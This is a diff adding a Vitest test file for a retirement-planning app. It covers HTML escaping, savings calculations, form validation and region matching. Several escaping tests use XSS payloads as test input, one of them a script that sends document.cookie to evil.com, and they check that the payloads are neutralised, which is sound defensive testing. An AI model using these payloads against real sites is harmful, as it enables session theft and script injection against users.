@@ -1,0 +1,313 @@
+import { describe, it, expect, vi, beforeEach } from 'vitest';
+import { escapeHtml, calcFinancials, validateStep, matchRegion } from './utils.js';
+
+// ── escapeHtml ─────────────────────────────────────────────────────────────
+describe('escapeHtml', () => {
+  it('escapes < and > to prevent tag injection', () => {
+    expect(escapeHtml('<script>alert(1)</script>')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
+  });
+
+  it('escapes & to prevent entity injection', () => {
+    expect(escapeHtml('AT&T')).toBe('AT&amp;T');
+  });
+
+  it('escapes double quotes', () => {
+    expect(escapeHtml('say "hello"')).toBe('say &quot;hello&quot;');
+  });
+
+  it('escapes single quotes', () => {
+    expect(escapeHtml("it's fine")).toBe("it&#x27;s fine");
+  });
+
+  it('returns empty string for null', () => {
+    expect(escapeHtml(null)).toBe('');
+  });
+
+  it('returns empty string for undefined', () => {
+    expect(escapeHtml(undefined)).toBe('');
+  });
+
+  it('passes through safe strings unchanged', () => {
+    expect(escapeHtml('Raju Kumar')).toBe('Raju Kumar');
+  });
+
+  it('handles XSS event handler injection attempt', () => {
+    const result = escapeHtml('<img src=x onerror="alert(1)">');
+    expect(result).not.toContain('<');
+    expect(result).not.toContain('>');
+    expect(result).not.toContain('"');
+  });
+
+  it('converts non-string values to string', () => {
+    expect(escapeHtml(42)).toBe('42');
+  });
+});
+
+// ── calcFinancials ─────────────────────────────────────────────────────────
+describe('calcFinancials', () => {
+  it('computes monthly savings correctly', () => {
+    const { monthlySave } = calcFinancials(150000, 65000, 800000, 5);
+    expect(monthlySave).toBe(85000);
+  });
+
+  it('computes target corpus as expenses × 12 × years', () => {
+    const { targetCorpus } = calcFinancials(150000, 65000, 800000, 5);
+    expect(targetCorpus).toBe(65000 * 12 * 5);
+  });
+
+  it('computes progress as percentage of corpus reached', () => {
+    const { progress } = calcFinancials(150000, 65000, 800000, 5);
+    const expected = Math.min((800000 / (65000 * 12 * 5)) * 100, 100);
+    expect(progress).toBeCloseTo(expected, 2);
+  });
+
+  it('caps progress at 100% when savings exceed target', () => {
+    const { progress } = calcFinancials(100000, 10000, 9999999, 1);
+    expect(progress).toBe(100);
+  });
+
+  it('returns monthsLeft = 9999 when not saving (expenses >= income)', () => {
+    const { monthsLeft } = calcFinancials(50000, 50000, 0, 5);
+    expect(monthsLeft).toBe(9999);
+  });
+
+  it('returns monthsLeft = 9999 when spending more than earning', () => {
+    const { monthsLeft } = calcFinancials(40000, 60000, 100000, 10);
+    expect(monthsLeft).toBe(9999);
+  });
+
+  it('computes months left correctly when saving positively', () => {
+    // corpus = 10000 * 12 * 1 = 120000; savings = 0; monthlySave = 10000
+    // monthsLeft = ceil((120000 - 0) / 10000) = 12
+    const { monthsLeft } = calcFinancials(20000, 10000, 0, 1);
+    expect(monthsLeft).toBe(12);
+  });
+
+  it('returns 0 progress when targetCorpus is 0', () => {
+    const { progress } = calcFinancials(100000, 0, 500000, 0);
+    expect(progress).toBe(0);
+  });
+});
+
+// ── validateStep ───────────────────────────────────────────────────────────
+const blankForm = {
+  name: '', age: '', transitionAge: '', profession: '',
+  stressDrivers: [], postPath: '',
+  climate: '', budget: '', priorities: [],
+  dependents: '',
+};
+
+describe('validateStep — step 0 (basic info)', () => {
+  it('requires name', () => {
+    const errs = validateStep(0, { ...blankForm });
+    expect(errs.name).toBeTruthy();
+  });
+
+  it('passes when name is provided', () => {
+    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '47', transitionAge: '55', profession: 'IT / Technology' });
+    expect(errs.name).toBeUndefined();
+  });
+
+  it('rejects age below 18', () => {
+    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '15', transitionAge: '25', profession: 'IT / Technology' });
+    expect(errs.age).toMatch(/valid age/);
+  });
+
+  it('rejects age above 125', () => {
+    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '130', transitionAge: '140', profession: 'IT / Technology' });
+    expect(errs.age).toMatch(/valid age/);
+  });
+
+  it('rejects transition age not greater than current age', () => {
+    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '50', transitionAge: '50', profession: 'IT / Technology' });
+    expect(errs.transitionAge).toMatch(/greater than/);
+  });
+
+  it('rejects transition age below current age', () => {
+    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '55', transitionAge: '45', profession: 'IT / Technology' });
+    expect(errs.transitionAge).toMatch(/greater than/);
+  });
+
+  it('requires profession', () => {
+    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '47', transitionAge: '55' });
+    expect(errs.profession).toBeTruthy();
+  });
+
+  it('returns no errors for a fully valid step 0', () => {
+    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '47', transitionAge: '55', profession: 'IT / Technology' });
+    expect(Object.keys(errs)).toHaveLength(0);
+  });
+});
+
+describe('validateStep — step 1 (stress drivers)', () => {
+  it('requires at least one stress driver', () => {
+    const errs = validateStep(1, { ...blankForm });
+    expect(errs.stressDrivers).toBeTruthy();
+  });
+
+  it('passes when at least one driver selected', () => {
+    const errs = validateStep(1, { ...blankForm, stressDrivers: ['Heavy workload'] });
+    expect(errs.stressDrivers).toBeUndefined();
+  });
+});
+
+describe('validateStep — step 2 (post path)', () => {
+  it('requires postPath selection', () => {
+    const errs = validateStep(2, { ...blankForm });
+    expect(errs.postPath).toBeTruthy();
+  });
+
+  it('passes when postPath is selected', () => {
+    const errs = validateStep(2, { ...blankForm, postPath: 'Full Retirement' });
+    expect(errs.postPath).toBeUndefined();
+  });
+});
+
+describe('validateStep — step 3 (lifestyle)', () => {
+  it('requires climate', () => {
+    const errs = validateStep(3, { ...blankForm, budget: '₹40k–₹75k/month', priorities: ['Mental peace'] });
+    expect(errs.climate).toBeTruthy();
+  });
+
+  it('requires budget', () => {
+    const errs = validateStep(3, { ...blankForm, climate: 'Cool / Hill (5–15°C)', priorities: ['Mental peace'] });
+    expect(errs.budget).toBeTruthy();
+  });
+
+  it('requires at least one priority', () => {
+    const errs = validateStep(3, { ...blankForm, climate: 'Cool / Hill (5–15°C)', budget: '₹40k–₹75k/month' });
+    expect(errs.priorities).toBeTruthy();
+  });
+
+  it('passes with all three fields filled', () => {
+    const errs = validateStep(3, { ...blankForm, climate: 'Any climate', budget: 'Under ₹40k/month', priorities: ['Low crowds'] });
+    expect(Object.keys(errs)).toHaveLength(0);
+  });
+});
+
+describe('validateStep — step 4 (dependents)', () => {
+  it('requires dependents field', () => {
+    const errs = validateStep(4, { ...blankForm });
+    expect(errs.dependents).toBeTruthy();
+  });
+
+  it('passes when dependents is filled', () => {
+    const errs = validateStep(4, { ...blankForm, dependents: 'None — just me' });
+    expect(errs.dependents).toBeUndefined();
+  });
+});
+
+// ── matchRegion ────────────────────────────────────────────────────────────
+const REGION_MAP = {
+  Asia: ["india", "japan", "singapore", "thailand", "malaysia"],
+  Europe: ["portugal", "spain", "france", "germany", "uk", "united kingdom"],
+  Americas: ["mexico", "colombia", "brazil", "canada", "united states", "usa"],
+  Africa: ["south africa", "kenya", "morocco"],
+  Oceania: ["australia", "new zealand"],
+};
+
+describe('matchRegion', () => {
+  it('matches an Indian city to Asia', () => {
+    expect(matchRegion({ region: 'India' }, 'Asia', REGION_MAP)).toBe(true);
+  });
+
+  it('matches a Japanese city to Asia', () => {
+    expect(matchRegion({ region: 'Japan' }, 'Asia', REGION_MAP)).toBe(true);
+  });
+
+  it('matches a Portuguese city to Europe', () => {
+    expect(matchRegion({ region: 'Portugal' }, 'Europe', REGION_MAP)).toBe(true);
+  });
+
+  it('matches the UK to Europe', () => {
+    expect(matchRegion({ region: 'United Kingdom' }, 'Europe', REGION_MAP)).toBe(true);
+  });
+
+  it('matches Brazil to Americas', () => {
+    expect(matchRegion({ region: 'Brazil' }, 'Americas', REGION_MAP)).toBe(true);
+  });
+
+  it('matches Australia to Oceania', () => {
+    expect(matchRegion({ region: 'Australia' }, 'Oceania', REGION_MAP)).toBe(true);
+  });
+
+  it('returns false for a mismatched region', () => {
+    expect(matchRegion({ region: 'India' }, 'Europe', REGION_MAP)).toBe(false);
+  });
+
+  it('is case-insensitive for the region string', () => {
+    expect(matchRegion({ region: 'JAPAN' }, 'Asia', REGION_MAP)).toBe(true);
+  });
+
+  it('handles missing region field gracefully', () => {
+    expect(matchRegion({}, 'Asia', REGION_MAP)).toBe(false);
+  });
+
+  it('handles an unknown filter gracefully', () => {
+    expect(matchRegion({ region: 'India' }, 'Unknown', REGION_MAP)).toBe(false);
+  });
+
+  it('handles partial region name match (e.g. South Africa)', () => {
+    expect(matchRegion({ region: 'South Africa' }, 'Africa', REGION_MAP)).toBe(true);
+  });
+});
+
+// ── askClaude (mocked fetch) ───────────────────────────────────────────────
+// askClaude is not exported from utils, but we can test the key behaviours
+// by importing from App — instead we test the logic inline here for isolation.
+
+describe('askClaude error handling (logic)', () => {
+  it('escapeHtml defends against script injection in name field (pen-test)', () => {
+    const maliciousName = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
+    const safe = escapeHtml(maliciousName);
+    expect(safe).not.toContain('<script>');
+    expect(safe).not.toContain('</script>');
+    expect(safe).toContain('&lt;script&gt;');
+  });
+
+  it('escapeHtml defends against img onerror XSS vector', () => {
+    const payload = '<img src=x onerror=alert(document.domain)>';
+    const safe = escapeHtml(payload);
+    // The tag syntax must be broken — no literal < remains, making it inert
+    expect(safe).not.toContain('<img');
+    expect(safe).toContain('&lt;img');
+    // The word "onerror" may remain as text but cannot execute without a real tag
+    expect(safe).toContain('&gt;');
+  });
+
+  it('escapeHtml defends against HTML attribute injection', () => {
+    const payload = '" onmouseover="alert(1)';
+    const safe = escapeHtml(payload);
+    expect(safe).not.toContain('"');
+    expect(safe).toContain('&quot;');
+  });
+
+  it('escapeHtml handles javascript: URI scheme attempt', () => {
+    const payload = 'javascript:alert(1)';
+    // No HTML chars here — should pass through unchanged (URI schemes
+    // need to be handled at the href level, not by escapeHtml)
+    const safe = escapeHtml(payload);
+    expect(safe).toBe('javascript:alert(1)');
+  });
+});
+
+// ── calcFinancials edge cases ──────────────────────────────────────────────
+describe('calcFinancials — edge cases', () => {
+  it('handles very large corpus goal without overflow', () => {
+    const { targetCorpus } = calcFinancials(500000, 400000, 0, 30);
+    expect(targetCorpus).toBe(400000 * 12 * 30);
+    expect(Number.isFinite(targetCorpus)).toBe(true);
+  });
+
+  it('handles zero income gracefully', () => {
+    const { monthlySave, monthsLeft } = calcFinancials(0, 50000, 0, 10);
+    expect(monthlySave).toBe(-50000);
+    expect(monthsLeft).toBe(9999);
+  });
+
+  it('months left is 0 or negative when already at target', () => {
+    // savings >= targetCorpus → monthsLeft will be 0 or negative (Math.ceil of ≤0)
+    const { monthsLeft } = calcFinancials(100000, 10000, 9999999, 1);
+    expect(monthsLeft).toBeLessThanOrEqual(0);
+  });
+});
